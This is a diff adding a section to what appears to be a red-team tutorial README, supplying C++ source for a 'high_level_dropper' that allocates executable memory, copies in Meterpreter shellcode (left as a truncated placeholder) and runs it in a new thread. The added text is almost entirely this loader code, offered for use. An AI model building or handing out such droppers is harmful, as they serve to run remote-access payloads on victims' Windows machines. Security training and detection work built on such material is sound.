@@ -33,5 +33,56 @@ The easiest way is to create a new console app project and then delete the defau
 <img width="645" alt="image" src="https://user-images.githubusercontent.com/50073731/235357228-940ec56c-7565-44b8-8b6a-01a74ab15e1d.png">
 </p>
 
+The following code can be used for the high_level_dropper.cpp
+```
+#include <stdio.h>
+#include <windows.h>
+
+// Define the thread function for executing shellcode
+// This function will be executed in a separate thread created later in the main function
+DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
+    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
+    void (*shellcode)() = (void (*)())lpParam;
+
+    // Call the shellcode function using the function pointer
+    shellcode();
+
+    // Return 0 as the thread exit code
+    return 0;
+}
+
+int main() {
+    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
+    unsigned char code[] = "\xfc\x48\x83...";
+
+    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
+    // 'exec' will hold the base address of the allocated memory region
+    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    // Copy the shellcode into the allocated memory region using WriteProcessMemory
+    SIZE_T bytesWritten;
+    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
+
+    // Create a new thread to execute the shellcode
+    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
+    // The returned handle of the created thread is stored in hThread
+    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);
+
+    // Wait for the shellcode execution thread to finish executing
+    // This ensures the main thread doesn't exit before the shellcode has finished running
+    WaitForSingleObject(hThread, INFINITE);
+
+    //// Clean up the resources after the shellcode execution
+    //// Close the handle to the shellcode execution thread
+    //CloseHandle(hThread);
+
+    //// Release the memory allocated for the shellcode
+    //VirtualFree(exec, 0, MEM_RELEASE);
+
+    // Return 0 as the main function exit code
+    return 0;
+}
+```
+
 
 
